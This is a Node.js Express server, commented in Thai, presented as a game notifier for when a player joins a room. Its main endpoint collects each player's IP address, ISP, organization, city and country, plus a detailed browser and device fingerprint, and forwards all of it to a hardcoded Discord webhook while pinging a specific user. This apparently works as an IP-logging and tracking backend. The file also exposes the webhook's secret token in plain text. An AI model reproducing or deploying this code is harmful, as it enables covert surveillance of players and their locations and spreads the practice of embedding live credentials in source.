const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();

// เพิ่ม CORS options ที่ครบถ้วน
app.use(cors({
  origin: '*',
  methods: ['GET', 'POST', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Accept', 'Authorization'],
  credentials: false
}));

app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1388197670891294931/OW78wRq5df6Vs6YrEkjASR6KEM5vWZV5zrVKQ8mgLoOB4t_yCiwxYDhiPWTedibRLiBk';

// เพิ่ม middleware สำหรับ logging
app.use((req, res, next) => {
  console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
  console.log('Headers:', JSON.stringify(req.headers, null, 2));
  if (req.body && Object.keys(req.body).length > 0) {
    console.log('Body:', JSON.stringify(req.body, null, 2));
  }
  next();
});

app.post('/notify-discord', async (req, res) => {
  try {
    console.log('📥 ได้รับข้อมูลจาก client');
    
    const { roomId, playerId, username, ip, clientInfo, locationInfo } = req.body;

    // ตรวจสอบข้อมูลที่จำเป็น
    if (!roomId || !playerId || !username) {
      console.log('❌ ข้อมูลไม่ครบถ้วน');
      return res.status(400).json({ 
        ok: false, 
        error: 'Missing required fields: roomId, playerId, username' 
      });
    }

    console.log(`👤 ผู้เล่น: ${username} (${playerId}) เข้าห้อง: ${roomId}`);
    console.log(`📱 อุปกรณ์: ${clientInfo?.deviceType || 'Unknown'}`);
    console.log(`🌐 IP: ${ip || 'Unknown'}`);
    console.log(`📍 ตำแหน่ง: ${locationInfo?.city || 'Unknown'}, ${locationInfo?.country || 'Unknown'}`);

    const message = "<@918384557131173988>";

    // สร้าง embed สำหรับ Discord
    const embed = {
      title: "🎮 ผู้เล่นใหม่เข้าร่วมเกม!",
      color: 0x00ff00, // สีเขียว
      timestamp: new Date().toISOString(),
      thumbnail: {
        url: "https://cdn-icons-png.flaticon.com/512/686/686589.png"
      },
      fields: [
        {
          name: "🏠 ข้อมูลห้อง",
          value: `**Room ID:** ${roomId}\n**Player ID:** ${playerId}\n**Username:** ${username}`,
          inline: false
        },
        {
          name: "🌐 ข้อมูลเครือข่าย",
          value: `**IP Address:** ${ip || 'Unknown'}\n**ISP:** ${locationInfo?.isp || 'Unknown'}\n**Organization:** ${locationInfo?.org || 'Unknown'}`,
          inline: true
        },
        {
          name: "📍 ตำแหน่งที่ตั้ง",
          value: `**ประเทศ:** ${locationInfo?.country || 'Unknown'} ${locationInfo?.countryCode ? `:flag_${locationInfo.countryCode.toLowerCase()}:` : ''}\n**จังหวัด:** ${locationInfo?.region || 'Unknown'}\n**เมือง:** ${locationInfo?.city || 'Unknown'}`,
          inline: true
        },
        {
          name: "💻 ข้อมูลอุปกรณ์",
          value: `**อุปกรณ์:** ${clientInfo?.deviceType || 'Unknown'}\n**ระบบปฏิบัติการ:** ${clientInfo?.platform || 'Unknown'}\n**CPU Cores:** ${clientInfo?.hardwareConcurrency || 'Unknown'}`,
          inline: true
        },
        {
          name: "🌏 เบราว์เซอร์",
          value: `**เบราว์เซอร์:** ${clientInfo?.browser || 'Unknown'} ${clientInfo?.browserVersion || ''}\n**ภาษา:** ${clientInfo?.language || 'Unknown'}\n**Connection:** ${clientInfo?.connectionType || 'Unknown'}`,
          inline: true
        },
        {
          name: "🖥️ ข้อมูลหน้าจอ",
          value: `**ความละเอียด:** ${clientInfo?.screenResolution || 'Unknown'}\n**Color Depth:** ${clientInfo?.screenColorDepth || 'Unknown'}-bit\n**Window Size:** ${clientInfo?.windowSize || 'Unknown'}`,
          inline: true
        },
        {
          name: "🕐 เวลา",
          value: `**Timezone:** ${clientInfo?.timezone || 'Unknown'}\n**เวลาท้องถิ่น:** ${clientInfo?.localTime || 'Unknown'}`,
          inline: true
        },
        {
          name: "🔗 ข้อมูลเพิ่มเติม",
          value: `**Referrer:** ${clientInfo?.referrer || 'Unknown'}\n**Cookie Enabled:** ${clientInfo?.cookieEnabled ? '✅' : '❌'}\n**Online Status:** ${clientInfo?.onLine ? '🟢' : '🔴'}\n**Touch Support:** ${clientInfo?.maxTouchPoints > 0 ? '✅' : '❌'}`,
          inline: false
        }
      ],
    };

    // เพิ่มข้อมูล iOS/iPad specific
    if (clientInfo?.isIOSDevice || clientInfo?.isMacTouch) {
      embed.fields.push({
        name: "🍎 ข้อมูล iOS/iPad",
        value: `**iOS Device:** ${clientInfo?.isIOSDevice ? '✅' : '❌'}\n**Mac with Touch:** ${clientInfo?.isMacTouch ? '✅' : '❌'}\n**Safari:** ${clientInfo?.isSafari ? '✅' : '❌'}\n**Max Touch Points:** ${clientInfo?.maxTouchPoints || 0}`,
        inline: false
      });
    }

    // เพิ่มข้อมูล User Agent สำหรับ debugging
    if (clientInfo?.userAgent) {
      embed.fields.push({
        name: "🔍 User Agent (สำหรับ Debug)",
        value: `\`\`\`${clientInfo.userAgent.substring(0, 500)}${clientInfo.userAgent.length > 500 ? '...' : ''}\`\`\``,
        inline: false
      });
    }

    console.log('📤 กำลังส่งไปยัง Discord...');

    const discordResponse = await axios.post(DISCORD_WEBHOOK_URL, {
      content: message,
      embeds: [embed]
    }, {
      timeout: 10000, // 10 seconds timeout
      headers: {
        'Content-Type': 'application/json'
      }
    });
    
    console.log(`✅ แจ้งเตือนสำเร็จ: ${username} เข้าร่วมห้อง ${roomId}`);
    console.log(`📊 Discord Response Status: ${discordResponse.status}`);
    
    res.json({ 
      ok: true, 
      message: 'Notification sent successfully',
      discord_status: discordResponse.status,
      timestamp: new Date().toISOString()
    });
    
  } catch (err) {
    console.error('❌ Error sending Discord notification:', {
      message: err.message,
      stack: err.stack,
      response: err.response?.data,
      status: err.response?.status
    });
    
    res.status(500).json({ 
      ok: false, 
      error: err.message,
      details: err.response?.data || 'No additional details',
      timestamp: new Date().toISOString()
    });
  }
});

// เพิ่ม endpoint สำหรับทดสอบ
app.get('/test', (req, res) => {
  console.log('🧪 Test endpoint called');
  res.json({ 
    status: 'Server is running!', 
    timestamp: new Date().toISOString(),
    userAgent: req.headers['user-agent'] || 'Unknown'
  });
});

// เพิ่ม endpoint สำหรับทดสอบ CORS
app.options('*', (req, res) => {
  console.log('✅ CORS preflight check');
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
  res.header('Access-Control-Allow-Headers', 'Content-Type,Accept,Authorization');
  res.sendStatus(200);
});

// เพิ่ม endpoint สำหรับทดสอบการส่งข้อมูล
app.post('/test-notification', async (req, res) => {
  try {
    console.log('🧪 Test notification endpoint called');
    console.log('📥 Test data received:', req.body);
    
    res.json({
      ok: true,
      message: 'Test notification received successfully',
      receivedData: req.body,
      timestamp: new Date().toISOString()
    });
  } catch (err) {
    console.error('❌ Test notification error:', err);
    res.status(500).json({
      ok: false,
      error: err.message,
      timestamp: new Date().toISOString()
    });
  }
});

// Error handling middleware
app.use((err, req, res, next) => {
  console.error('💥 Unhandled error:', err);
  res.status(500).json({
    ok: false,
    error: 'Internal server error',
    message: err.message,
    timestamp: new Date().toISOString()
  });
});

// Handle 404 - Fixed the problematic route pattern
app.use((req, res) => {
  console.log(`❓ 404 - Path not found: ${req.method} ${req.originalUrl}`);
  res.status(404).json({
    ok: false,
    error: 'Path not found',
    path: req.originalUrl,
    method: req.method,
    timestamp: new Date().toISOString()
  });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server started on port ${PORT}`);
  console.log(`📡 Server URL: http://localhost:${PORT}`);
  console.log(`🔗 Test URL: http://localhost:${PORT}/test`);
  console.log(`⏰ Started at: ${new Date().toISOString()}`);
});
